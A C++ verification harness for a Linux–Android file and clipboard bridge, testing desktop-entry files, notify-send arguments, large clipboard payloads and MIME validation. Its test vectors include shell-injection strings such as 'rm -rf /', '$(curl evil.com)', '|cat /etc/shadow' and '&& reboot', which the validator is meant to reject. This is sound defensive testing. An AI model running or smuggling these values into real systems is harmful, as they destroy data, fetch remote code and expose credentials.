#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <array>
#include <filesystem>
#include <chrono>
#include <cstdlib>
#include <sstream>
#include <thread>
#include <sys/stat.h>
#include <unistd.h>

#include "desktop_entry.hpp"
#include "wayland_clipboard.hpp"
#include "l2a/engine.hpp"
#include "l2a/sha256.hpp"

namespace fs = std::filesystem;

#define HARNESS_ASSERT(cond, msg) \
    do { \
        if (!(cond)) { \
            std::cerr << "[-] HARNESS FAILED: " << msg << " (" << #cond << ") at line " << __LINE__ << "\n"; \
            std::exit(1); \
        } \
    } while (0)

static std::vector<std::string> read_lines(const fs::path& p) {
    std::vector<std::string> lines;
    std::ifstream in(p);
    std::string line;
    while (std::getline(in, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        lines.push_back(line);
    }
    return lines;
}

int main() {
    std::cout << "=========================================================\n";
    std::cout << "[CHALLENGER_M3_C2_2] Deep Empirical Verification Harness\n";
    std::cout << "=========================================================\n";

    // -----------------------------------------------------------------
    // Section 1: Line-by-line verification of ensure_desktop_entry_installed
    // -----------------------------------------------------------------
    std::cout << "[STEP 1] Testing ensure_desktop_entry_installed line-by-line in isolated temp HOME...\n";
    fs::path temp_home = fs::temp_directory_path() / ("l2a_challenger_home_" + std::to_string(::getpid()));
    std::error_code ec;
    fs::remove_all(temp_home, ec);

    l2a::linux_app::ensure_desktop_entry_installed(temp_home);

    fs::path desktop_file = temp_home / ".local" / "share" / "applications" / "l2a-desktop.desktop";
    HARNESS_ASSERT(fs::exists(desktop_file), "Desktop file must exist");

    struct stat st{};
    HARNESS_ASSERT(::stat(desktop_file.c_str(), &st) == 0, "stat must succeed");
    HARNESS_ASSERT((st.st_mode & 0777) == 0644, "File permissions must be 0644");

    auto lines = read_lines(desktop_file);
    std::cout << "  -> Read " << lines.size() << " lines from " << desktop_file << "\n";
    for (size_t i = 0; i < lines.size(); ++i) {
        std::cout << "     Line " << (i + 1) << ": " << lines[i] << "\n";
    }

    HARNESS_ASSERT(lines.size() >= 9, "Desktop entry must have at least 9 lines");
    HARNESS_ASSERT(lines[0] == "[Desktop Entry]", "Line 1 must be [Desktop Entry]");
    HARNESS_ASSERT(lines[1] == "Type=Application", "Line 2 must be Type=Application");
    HARNESS_ASSERT(lines[2].rfind("Name=", 0) == 0 && lines[2].find("Linux ⇄ Android") != std::string::npos, "Line 3 Name matches");
    HARNESS_ASSERT(lines[3].rfind("Comment=", 0) == 0, "Line 4 Comment matches");
    HARNESS_ASSERT(lines[4].rfind("Exec=", 0) == 0, "Line 5 Exec matches");
    HARNESS_ASSERT(lines[5] == "Icon=network-transmit-receive", "Line 6 Icon matches");
    HARNESS_ASSERT(lines[6] == "Terminal=false", "Line 7 Terminal matches");
    HARNESS_ASSERT(lines[7] == "Categories=Utility;Network;FileTransfer;", "Line 8 Categories matches");
    HARNESS_ASSERT(lines[8] == "StartupNotify=false", "Line 9 StartupNotify matches");

    // Idempotence test: call ensure_desktop_entry_installed again
    l2a::linux_app::ensure_desktop_entry_installed(temp_home);
    auto lines2 = read_lines(desktop_file);
    HARNESS_ASSERT(lines2 == lines, "Repeated calls must be idempotent");

    fs::remove_all(temp_home, ec);
    std::cout << "  -> PASSED: Line-by-line verification and idempotence confirmed.\n";

    // -----------------------------------------------------------------
    // Section 2: Verification of build_desktop_notification_args
    // -----------------------------------------------------------------
    std::cout << "[STEP 2] Testing build_desktop_notification_args with diverse payloads...\n";
    struct NotificationTestVector {
        std::string title;
        std::string body;
    };
    std::vector<NotificationTestVector> test_vectors = {
        {"文件传输完成", "photo_2026.jpg"},
        {"已同步手机剪贴板", "https://example.com/test?a=1&b=2; rm -rf /"},
        {"", ""},
        {"Special chars: \t \n \" ' ` $()", "Body with emoji \U0001F680 and unicode: 跨端互通 100%"}
    };

    for (const auto& vec : test_vectors) {
        auto args = l2a::linux_app::build_desktop_notification_args(vec.title, vec.body);
        HARNESS_ASSERT(args.size() == 9, "Arguments vector must have exactly 9 elements");
        HARNESS_ASSERT(args[0] == "notify-send", "Arg 0 is notify-send");
        HARNESS_ASSERT(args[1] == "-a", "Arg 1 is -a");
        HARNESS_ASSERT(args[2] == "Linux ⇄ Android", "Arg 2 is app name");
        HARNESS_ASSERT(args[3] == "-i", "Arg 3 is -i");
        HARNESS_ASSERT(args[4] == "network-transmit-receive", "Arg 4 is app icon");
        HARNESS_ASSERT(args[5] == "-h", "Arg 5 is -h");
        HARNESS_ASSERT(args[6] == "string:desktop-entry:l2a-desktop", "Arg 6 is desktop-entry hint");
        HARNESS_ASSERT(args[7] == vec.title, "Arg 7 matches title verbatim");
        HARNESS_ASSERT(args[8] == vec.body, "Arg 8 matches body verbatim");
    }
    std::cout << "  -> PASSED: Notification arguments and GNOME stacking hints verified.\n";

    // -----------------------------------------------------------------
    // Section 3: Wayland Clipboard Bridge >512KB Temp File Streaming
    // -----------------------------------------------------------------
    std::cout << "[STEP 3] Testing Wayland clipboard bridge streaming on payloads > 512KB...\n";
    fs::path bridge_test_dir = fs::temp_directory_path() / ("l2a_challenger_bridge_" + std::to_string(::getpid()));
    fs::remove_all(bridge_test_dir, ec);
    fs::create_directories(bridge_test_dir, ec);

    l2a::EngineConfig cfg{};
    cfg.storage_dir = bridge_test_dir / "storage";
    cfg.receive_dir = bridge_test_dir / "receive";
    cfg.listen_port = 0;
    cfg.discovery_port = 0;

    l2a::Engine engine(cfg);
    std::vector<std::string> logs;
    l2a::linux_app::WaylandClipboardBridge bridge(engine, [&](const std::string& msg) {
        logs.push_back(msg);
    });

    // Test exact boundary: 512KB - 1, 512KB, 512KB + 1, 1MB
    std::vector<size_t> test_sizes = {
        512 * 1024 - 1,
        512 * 1024,
        512 * 1024 + 1,
        1024 * 1024
    };

    for (size_t sz : test_sizes) {
        fs::path tmp_file = bridge_test_dir / ("payload_" + std::to_string(sz) + ".tmp");
        std::string payload_content(sz, static_cast<char>('A' + (sz % 26)));
        {
            std::ofstream ofs(tmp_file, std::ios::binary);
            HARNESS_ASSERT(ofs.is_open(), "Temp file must open for writing");
            ofs.write(payload_content.data(), static_cast<std::streamsize>(payload_content.size()));
        }

        l2a::ReceivedClipboardItem item{};
        item.clip_id = static_cast<uint64_t>(sz);
        item.mime_type = "text/plain";
        item.temp_file_path = tmp_file.string();
        item.total_size = sz;

        bridge.apply_remote_clipboard(item);

        // Verify log recorded the size
        bool log_found = false;
        std::string expected_size_str = std::to_string(sz) + " B";
        for (const auto& l : logs) {
            if (l.find(expected_size_str) != std::string::npos) {
                log_found = true;
                break;
            }
        }
        HARNESS_ASSERT(log_found, ("Log must record receipt of size " + expected_size_str).c_str());
    }
    std::cout << "  -> PASSED: Boundary and large payload streaming (512KB-1, 512KB, 512KB+1, 1MB) verified.\n";

    // -----------------------------------------------------------------
    // Section 4: MIME Type Injection Attack Vectors
    // -----------------------------------------------------------------
    std::cout << "[STEP 4] Stress-testing MIME validation against adversarial injection payloads...\n";
    std::vector<std::string> injection_mimes = {
        "",
        "plain_text_without_slash",
        "text/plain; rm -rf /",
        "text/plain$(curl evil.com)",
        "text/plain`id`",
        "text/plain\n",
        "text/plain\r\n",
        "text/plain' OR '1'='1",
        "text/plain\" && reboot",
        "text/plain|cat /etc/shadow",
        "text/plain>out.txt",
        "text/plain<in.txt",
        "text/plain&",
        "text/plain;",
        "text/plain\\\\",
        std::string(129, 'a') + "/test", // > 128 characters
        "text/plain with spaces",
        "text/\x1b[31mplain"
    };

    for (const auto& bad_mime : injection_mimes) {
        bool allowed = l2a::linux_app::WaylandClipboardBridge::is_valid_mime_type(bad_mime);
        HARNESS_ASSERT(!allowed, ("Adversarial injection MIME must be rejected: " + bad_mime).c_str());

        // Test apply_remote_clipboard rejection
        size_t initial_log_count = logs.size();
        l2a::ReceivedClipboardItem evil_item{};
        evil_item.clip_id = 999;
        evil_item.mime_type = bad_mime;
        evil_item.data = {'e', 'v', 'i', 'l'};
        evil_item.total_size = evil_item.data.size();
        bridge.apply_remote_clipboard(evil_item);

        // Verify that safe rejection was logged or dropped
        bool blocked_logged = false;
        for (size_t i = initial_log_count; i < logs.size(); ++i) {
            if (logs[i].find("安全拦截") != std::string::npos) {
                blocked_logged = true;
                break;
            }
        }
        HARNESS_ASSERT(blocked_logged, ("Rejection must be logged for: " + bad_mime).c_str());
    }
    std::cout << "  -> PASSED: All 18 adversarial MIME injection attack vectors intercepted.\n";

    // Edge check on bare slash MIME strings:
    // Characters '/' are allowed by character set whitelist, but verify they cannot execute shell commands
    std::vector<std::string> edge_mimes = {"/", "//", "text/", "/text"};
    for (const auto& edge : edge_mimes) {
        l2a::ReceivedClipboardItem edge_item{};
        edge_item.clip_id = 1000;
        edge_item.mime_type = edge;
        edge_item.data = {'e', 'd', 'g', 'e'};
        edge_item.total_size = edge_item.data.size();
        // apply_remote_clipboard must execute safely without crash or shell execution
        bridge.apply_remote_clipboard(edge_item);
    }
    std::cout << "  -> PASSED: Edge slash MIME strings handled safely without crash or shell execution.\n";

    fs::remove_all(bridge_test_dir, ec);
    std::cout << "=========================================================\n";
    std::cout << "[CHALLENGER_M3_C2_2] ALL EMPIRICAL VERIFICATIONS PASSED!\n";
    std::cout << "=========================================================\n";
    return 0;
}
